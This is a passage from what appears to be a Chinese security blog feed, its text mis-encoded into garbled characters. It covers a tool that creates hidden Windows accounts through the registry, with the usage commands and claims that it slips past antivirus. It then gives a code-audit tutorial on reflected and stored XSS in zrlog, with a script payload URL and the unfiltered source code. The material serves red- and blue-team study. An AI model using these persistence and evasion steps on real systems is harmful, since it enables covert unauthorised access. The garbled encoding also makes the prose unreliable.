teamssix$ å°±è¡Œäº†ã€‚</p><p>ä¸è¿‡è¿™ç§æ–¹æ³•ä¾ç„¶æ˜¯æœ‰ç ´ç»½çš„ï¼Œæ¯”å¦‚åœ¨æ³¨å†Œè¡¨é‡Œè¿˜æ˜¯èƒ½å‘ç° teamssix$ ç”¨æˆ·çš„ï¼Œä½¿ç”¨ wmic ä¹Ÿèƒ½çœ‹åˆ°è¯¥ç”¨æˆ·ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181404578.png"></p><p>è€Œä¸”å½“ç”µè„‘é‡å¯åï¼Œåœ¨è®¡ç®—æœºç®¡ç†é‡Œä¹Ÿèƒ½çœ‹åˆ°åˆšåˆšåˆ›å»ºçš„éšè—è´¦å·ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181404120.png"></p><h1 id="0x02-åˆ›å»ºéšè—è´¦å·çš„å·¥å…·ä»‹ç»"><a href="#0x02-åˆ›å»ºéšè—è´¦å·çš„å·¥å…·ä»‹ç»" class="headerlink" title="0x02 åˆ›å»ºéšè—è´¦å·çš„å·¥å…·ä»‹ç»"></a>0x02 åˆ›å»ºéšè—è´¦å·çš„å·¥å…·ä»‹ç»</h1><h2 id="å·¥å…·ä»‹ç»"><a href="#å·¥å…·ä»‹ç»" class="headerlink" title="å·¥å…·ä»‹ç»"></a>å·¥å…·ä»‹ç»</h2><p>å¯¹æ¯”äº†ä¸‹ä¸¤ç§æ–¹æ³•ï¼Œè™½ç„¶éƒ½æœ‰åŠæ³•å»å‘ç°éšè—è´¦å·ï¼Œä½†æ˜¯ç¬¬äºŒç§ä¿®æ”¹æ³¨å†Œè¡¨çš„æ–¹æ³•å¾ˆæ˜æ˜¾éšè—æ€§è¿˜æ˜¯æ›´å¥½äº›ï¼Œåªæ˜¯æ“ä½œèµ·æ¥æœ‰äº›éº»çƒ¦ï¼Œä½†æ˜¯åˆæ²¡æœ‰ä»€ä¹ˆç”¨ç€é¡ºæ‰‹çš„å·¥å…·ï¼Œæ‰€ä»¥è¿™é‡Œè‡ªå·±å†™äº†ä¸€ä¸ªåˆ©ç”¨æ³¨å†Œè¡¨æ·»åŠ éšè—è´¦å·çš„å°å·¥å…·ã€‚</p><p><strong>å…è´£å£°æ˜ï¼šè¯·å‹¿å°†å·¥å…·ç”¨äºéæ³•ç”¨é€”ï¼Œå¼€å‘äººå‘˜ä¸æ‰¿æ‹…ä»»ä½•è´£ä»»ï¼Œä¹Ÿä¸å¯¹ä»»ä½•æ»¥ç”¨æˆ–æŸåè´Ÿè´£ã€‚</strong></p><p>å·¥å…·åœ°å€ï¼š<a href="https://github.com/wgpsec/CreateHiddenAccount">https://github.com/wgpsec/CreateHiddenAccount</a></p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181405087.png">å‘½ä»¤å¸®åŠ©ä¿¡æ¯</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token operator">-</span>c æ£€æŸ¥å½“å‰ç³»ç»Ÿçš„éšè—è´¦æˆ·<span class="token operator">-</span>d æŒ‡å®šè¦åˆ é™¤çš„ç”¨æˆ·åï¼Œå¦‚æœæ·»åŠ çš„ç”¨æˆ·åä¸æ˜¯ä»¥ $ ç»“å°¾ï¼Œåˆ™å·¥å…·ä¼šè‡ªåŠ¨åœ¨ç”¨æˆ·ååæ·»åŠ ä¸Š $<span class="token operator">-</span>p æŒ‡å®šæ·»åŠ çš„ç”¨æˆ·çš„å¯†ç <span class="token operator">-</span>u æŒ‡å®šè¦æ·»åŠ çš„ç”¨æˆ·åï¼Œå¦‚æœæ·»åŠ çš„ç”¨æˆ·åä¸æ˜¯ä»¥ $ ç»“å°¾ï¼Œåˆ™å·¥å…·ä¼šè‡ªåŠ¨åœ¨ç”¨æˆ·ååæ·»åŠ ä¸Š $<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å·¥å…·ä½¿ç”¨"><a href="#å·¥å…·ä½¿ç”¨" class="headerlink" title="å·¥å…·ä½¿ç”¨"></a>å·¥å…·ä½¿ç”¨</h2><p>ä¾‹å¦‚è¿™é‡Œæ·»åŠ ä¸€ä¸ªç”¨æˆ·åä¸º teamssix çš„éšè—è´¦å·ï¼Œå·¥å…·ä¼šè‡ªåŠ¨åœ¨ç”¨æˆ·ååæ·»åŠ  $ ç¬¦ï¼Œå› æ­¤åˆ›å»ºåçš„ç”¨æˆ·åä¸º teamssix$</p><p>ä½¿ç”¨çš„æ—¶å€™ï¼Œè®°å¾—åœ¨ç®¡ç†å‘˜æƒé™ä¸‹è¿è¡Œï¼Œä¸ç„¶ä¼šæç¤ºæƒé™ä¸è¶³</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>u teamssix <span class="token operator">-</span>p Passw0rd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181405373.png"></p><p>åˆ›å»ºå®Œåï¼Œé€šè¿‡ net user å’Œæ§åˆ¶é¢æ¿ç­‰ç­‰éƒ½æ˜¯çœ‹ä¸åˆ°è¿™ä¸ªè´¦å·çš„</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406619.png"></p><p>æ£€æŸ¥å½“å‰ç³»ç»Ÿçš„éšè—è´¦å·</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406908.png"></p><p>åˆ é™¤ teamssix éšè—è´¦å·ï¼Œå½“åˆ é™¤å®Œè´¦å·åï¼Œå†æ¬¡æ£€æŸ¥å½“å‰ç³»ç»Ÿçš„éšè—è´¦å·ï¼Œå¯ä»¥çœ‹åˆ°å°±æç¤ºæ²¡æœ‰éšè—è´¦å·äº†</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">CreateHiddenAccount<span class="token punctuation">.</span>exe <span class="token operator">-</span>d teamssix<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406722.png"></p><h2 id="å…æ€èƒ½åŠ›"><a href="#å…æ€èƒ½åŠ›" class="headerlink" title="å…æ€èƒ½åŠ›"></a>å…æ€èƒ½åŠ›</h2><p>å› ä¸ºåœ¨å·¥å…·é‡Œæ˜¯åˆ©ç”¨ Windows API åˆ›å»ºçš„ç”¨æˆ·ï¼Œæ‰€ä»¥å¤©ç„¶å…·æœ‰ä¸€å®šçš„å…æ€èƒ½åŠ›ï¼Œä¸è¿‡å› ä¸ºå·¥å…·é‡Œéœ€è¦å¯¹æ³¨å†Œè¡¨è¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥è¿˜æ˜¯ä¼šè¢«æ€è½¯å‘ç°ã€‚</p><p>æˆ‘è¿™é‡Œç”¨ 360 å’Œç«ç»’æµ‹è¯•äº†ä¸‹å…æ€çš„èƒ½åŠ›ï¼Œæƒ…å†µå¤§ä½“å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202201181406221.png"></p><p>æ•´ä½“ä¸Šï¼Œé™¤äº†åœ¨æ·»åŠ ç”¨æˆ·çš„æ—¶å€™ï¼Œ360 ä¼šå¼¹çª—è¯¢é—®è¦ä¸è¦å…è®¸ä¿®æ”¹æ³¨å†Œè¡¨å¤–ï¼Œå…¶ä»–æ—¶å€™æ€è½¯éƒ½æ˜¯æ²¡åŠ¨é™çš„ï¼Œä¸ªäººè§‰ç€è¿˜è¡Œã€‚</p><p>ä¸è¿‡è¿™ä¸ªä¹Ÿåªæ˜¯æˆ‘å½“æ—¶çš„æ£€æµ‹æƒ…å†µï¼Œä¹Ÿè®¸æ˜å¤©åå¤©å°±ä¼šè¢«æŸ¥æ€ï¼Œè¿™ä¸ªä¹Ÿæ˜¯å¾ˆæ­£å¸¸çš„äº‹å„¿ã€‚</p><h1 id="0x03-åè®°"><a href="#0x03-åè®°" class="headerlink" title="0x03 åè®°"></a>0x03 åè®°</h1><p>æˆ‘çœ‹åˆ°ä¸€äº›åŒç±»å·¥å…·åªæœ‰æ·»åŠ éšè—è´¦å·çš„åŠŸèƒ½ï¼Œè¿™ä¸ªå·¥å…·é™¤äº†æ·»åŠ éšè—è´¦å·å¤–ï¼Œæˆ‘è¿˜ç»™å®ƒä¹ŸåŠ å…¥äº†æ£€æŸ¥éšè—è´¦å·å’Œåˆ é™¤éšè—è´¦å·çš„åŠŸèƒ½ï¼Œè¿™æ ·ä¸ç®¡æ˜¯çº¢é˜Ÿè¿˜æ˜¯è“é˜Ÿï¼Œéƒ½å¯ä»¥ä½¿ç”¨åˆ°è¿™æ¬¾å·¥å…·ã€‚</p><p>æœ€åï¼Œå¦‚æœæœ‰ä»€ä¹ˆ bug å¯ä»¥ç›´æ¥åœ¨ Github çš„é¡¹ç›®åœ°å€ä¸Šç»™æˆ‘æ issueï¼Œå¦å¤– Star å°±ä¸è¦äº†ï¼Œä½ æ‡‚çš„ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/TeamsSix_Subscription_Logo2.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;0x00-å‰è¨€&quot;&gt;&lt;a href=&quot;#0x00-å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;0x00 å‰è¨€&quot;&gt;&lt;/a&gt;0x00 å‰è¨€&lt;/h1&gt;&lt;p&gt;æœ€è¿‘åœ¨å¯¹ä»¥å‰æ‰€åšçš„ç¬”è®°è¿›è¡Œæ¢³ç†çš„æ—¶å€™ï¼Œå‘ç°è¿˜æ²¡è®°å½•è¿‡éšè—è´¦å·çš„ç¬”è®°ï¼Œè¿™é‡Œå°±è¡¥å……ä¸€ä¸‹ã€‚&lt;/p&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="å·¥å…·åˆ†äº«" scheme="https://www.teamssix.com/categories/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    
    <category term="çº¢é˜Ÿ" scheme="https://www.teamssix.com/tags/%E7%BA%A2%E9%98%9F/"/>
    
    <category term="å·¥å…·åˆ†äº«" scheme="https://www.teamssix.com/tags/%E5%B7%A5%E5%85%B7%E5%88%86%E4%BA%AB/"/>
    
    <category term="è“é˜Ÿ" scheme="https://www.teamssix.com/tags/%E8%93%9D%E9%98%9F/"/>
    
  </entry>
  
  <entry>
    <title>ã€ä»£ç å®¡è®¡ã€‘è·¨ç«™è„šæœ¬ XSS</title>
    <link href="https://www.teamssix.com/211220-164519.html"/>
    <id>https://www.teamssix.com/211220-164519.html</id>
    <published>2021-12-20T08:45:19.000Z</published>
    <updated>2021-12-21T07:18:39.571Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x01-åå°„å‹-XSS"><a href="#0x01-åå°„å‹-XSS" class="headerlink" title="0x01 åå°„å‹ XSS"></a>0x01 åå°„å‹ XSS</h1><p>ä»¥ä¸‹ä»£ç å±•ç¤ºäº†åå°„å‹ XSS æ¼æ´äº§ç”Ÿçš„å¤§æ¦‚å½¢å¼</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token operator">&lt;</span><span class="token operator">%</span>    <span class="token class-name">String</span> name <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"name"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">String</span> studentId <span class="token operator">=</span> request<span class="token punctuation">.</span><span class="token function">getParameter</span><span class="token punctuation">(</span><span class="token string">"sid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"name = "</span><span class="token operator">+</span>name<span class="token punctuation">)</span><span class="token punctuation">;</span>    out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"studentId = "</span><span class="token operator">+</span>studentId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">%</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å½“è®¿é—® <a href="http://localhost:8080/xss_demo/reflected_xss.jsp?name=1&sid=alert(1)">http://localhost:8080/xss_demo/reflected_xss.jsp?name=1&amp;sid=%3Cscript%3Ealert(1)%3C/script%3E</a> æ—¶ï¼Œå°±ä¼šè§¦å‘ XSS ä»£ç </p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646020.png"></p><h1 id="0x02-å­˜å‚¨å‹-XSS"><a href="#0x02-å­˜å‚¨å‹-XSS" class="headerlink" title="0x02 å­˜å‚¨å‹ XSS"></a>0x02 å­˜å‚¨å‹ XSS</h1><p>è¿™é‡Œä»¥ zrlog v1.9.1.0227 é¶åœºè¿›è¡Œç¤ºä¾‹</p><h2 id="éƒ¨ç½²é¶åœº"><a href="#éƒ¨ç½²é¶åœº" class="headerlink" title="éƒ¨ç½²é¶åœº"></a>éƒ¨ç½²é¶åœº</h2><p>é¶åœº war åŒ…ä¸‹è½½åœ°å€ï¼š<a href="http://dl.zrlog.com/release/zrlog-1.9.1-cd87f93-release.war">http://dl.zrlog.com/release/zrlog-1.9.1-cd87f93-release.war</a></p><p>å®‰è£…å‚è€ƒå®˜æ–¹å®‰è£…æ–‡æ¡£å³å¯ï¼š<a href="https://blog.zrlog.com/post/how-to-install-zrlog">https://blog.zrlog.com/post/how-to-install-zrlog</a></p><h2 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h2><p>æ¥åˆ°åå°ï¼Œç¼–è¾‘æ ‡é¢˜å¤„ï¼Œåœ¨æ ‡é¢˜çš„ä½ç½®æ’å…¥ XSS è¯­å¥</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646981.png"></p><p>è®¿é—®ä¸»é¡µï¼Œå¯ä»¥çœ‹åˆ° XSS è¯­å¥è¢«æ‰§è¡Œ</p><p><img src="https://cdn.jsdelivr.net/gh/teamssix/BlogImages/imgs/202112201646003.png"></p><p>é€šè¿‡æŠ“åŒ…å¯ä»¥çœ‹åˆ°æäº¤ XSS è¯­å¥æ—¶çš„ URL ä¸º /api/admin/website/update</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>æŸ¥çœ‹è¯¥é¡¹ç›®çš„ Web.xml å¯ä»¥çœ‹åˆ°é€šè¿‡ç±» com.zrlog.web.config.ZrLogConfig è¿›è¡Œè®¿é—®æ§åˆ¶</p><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>init-param</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-name</span><span class="token punctuation">></span></span>configClass<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-name</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>param-value</span><span class="token punctuation">></span></span>com.zrlog.web.config.ZrLogConfig<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>param-value</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>init-param</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> æŸ¥çœ‹ WEB-INF/classes/com/zrlog/web/config/ZrLogConfig.class æ–‡ä»¶</p><p>å¯ä»¥çœ‹åˆ°è¿™ä»½æºç çš„è·¯ç”±é…ç½®ä¿¡æ¯</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">configRoute</span><span class="token punctuation">(</span><span class="token class-name">Routes</span> routes<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/post"</span><span class="token punctuation">,</span> <span class="token class-name">PostController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api"</span><span class="token punctuation">,</span> <span class="token class-name">APIController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> <span class="token class-name">PostController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/install"</span><span class="token punctuation">,</span> <span class="token class-name">InstallController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    routes<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">AdminRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æŸ¥çœ‹ AdminRoutes() æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">class</span> <span class="token class-name">AdminRoutes</span> <span class="token keyword">extends</span> <span class="token class-name">Routes</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">AdminRoutes</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">config</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin"</span><span class="token punctuation">,</span> <span class="token class-name">AdminPageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin/template"</span><span class="token punctuation">,</span> <span class="token class-name">AdminTemplatePageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/admin/article"</span><span class="token punctuation">,</span> <span class="token class-name">AdminArticlePageController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin"</span><span class="token punctuation">,</span> <span class="token class-name">AdminController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/link"</span><span class="token punctuation">,</span> <span class="token class-name">LinkController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/comment"</span><span class="token punctuation">,</span> <span class="token class-name">CommentController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/tag"</span><span class="token punctuation">,</span> <span class="token class-name">TagController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/type"</span><span class="token punctuation">,</span> <span class="token class-name">TypeController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/nav"</span><span class="token punctuation">,</span> <span class="token class-name">BlogNavController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/article"</span><span class="token punctuation">,</span> <span class="token class-name">ArticleController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/website"</span><span class="token punctuation">,</span> <span class="token class-name">WebSiteController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/template"</span><span class="token punctuation">,</span> <span class="token class-name">TemplateController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/upload"</span><span class="token punctuation">,</span> <span class="token class-name">UploadController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">"/api/admin/upgrade"</span><span class="token punctuation">,</span> <span class="token class-name">UpgradeController</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»ä¸Šé¢ä»£ç çš„ç¬¬ 16 è¡Œå¯ä»¥çœ‹åˆ° /api/admin/website å¯¹åº”åˆ° WebSiteController ç±»</p><p>æŸ¥çœ‹ WebSiteController ç±»çš„ä»£ç </p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token class-name">WebSiteSettingUpdateResponse</span> <span class="token function">update</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token class-name">Map</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> requestMap <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Map</span><span class="token punctuation">)</span><span class="token class-name">ZrLogUtil</span><span class="token punctuation">.</span><span class="token function">convertRequestBody</span><span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">getRequest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token class-name">Map</span><span class="token punctuation">.</span><span class="token keyword">class</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token class-name">Iterator</span> var2 <span class="token operator">=</span> requestMap<span class="token punctuation">.</span><span class="token function">entrySet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">iterator</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>var2<span class="token punctuation">.</span><span class="token function">hasNext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Entry</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">String</span><span class="token punctuation">,</span> <span class="token class-name">Object</span><span class="token punctuation">></span></span> param <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">Entry</span><span class="token punctuation">)</span>var2<span class="token punctuation">.</span><span class="token function">next</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">WebSite</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">updateByKV</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">)</span>param<span class="token punctuation">.</span><span class="token function">getKey</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> param<span class="token punctuation">.</span><span class="token function">getValue</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token class-name">WebSiteSettingUpdateResponse</span> updateResponse <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">WebSiteSettingUpdateResponse</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    updateResponse<span class="token punctuation">.</span><span class="token function">setError</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> updateResponse<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ä»ä¸Šé¢ä»£ç çš„ç¬¬ 2 è¡Œå¯ä»¥çœ‹åˆ°ï¼Œupdate æ–¹æ³•ä¼šæŠŠä¼ è¾“è¿‡æ¥çš„æ•°æ®å­˜å‚¨åˆ° requestMap å¯¹è±¡é‡Œï¼Œå¹¶é€šè¿‡ updateByKV æ–¹æ³•è¿›è¡Œæ•°æ®æ›´æ–°ã€‚</p><p>å› æ­¤è¿™é‡Œéœ€è¦å¯¹ updateByKV è¿›è¡Œåˆ†æï¼Œåˆ¤æ–­å…¶æœ‰æ²¡æœ‰å¯¹è¾“å…¥å†…å®¹è¿›è¡Œè¿‡æ»¤ã€‚</p><p>æŸ¥çœ‹ updateByKV æ–¹æ³•</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">boolean</span> <span class="token function">updateByKV</span><span class="token punctuation">(</span><span class="token class-name">String</span> name<span class="token punctuation">,</span> <span class="token class-name">Object</span> value<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">queryInt</span><span class="token punctuation">(</span><span class="token string">"select siteId from "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">" where name=?"</span><span class="token punctuation">,</span> name<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token keyword">null</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">"update "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">" set value=? where name=?"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        <span class="token class-name">Db</span><span class="token punctuation">.</span><span class="token function">update</span><span class="token punctuation">(</span><span class="token string">"insert "</span> <span class="token operator">+</span> TABLE_NAME <span class="token operator">+</span> <span class="token string">"(`value`,`name`) value(?,?)"</span><span class="token punctuation">,</span> value<span class="token punctuation">,</span> name<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°è¿™é‡Œå¹¶æ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œè¿‡æ»¤ï¼Œç›´æ¥å°†æ•°æ®å­˜å‚¨åˆ°äº†æ•°æ®åº“é‡Œã€‚</p><p>æ¥ä¸‹æ¥åˆ†æä¸€ä¸‹è¾“å‡ºçš„åœ°æ–¹</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>site-name<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>i</span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token 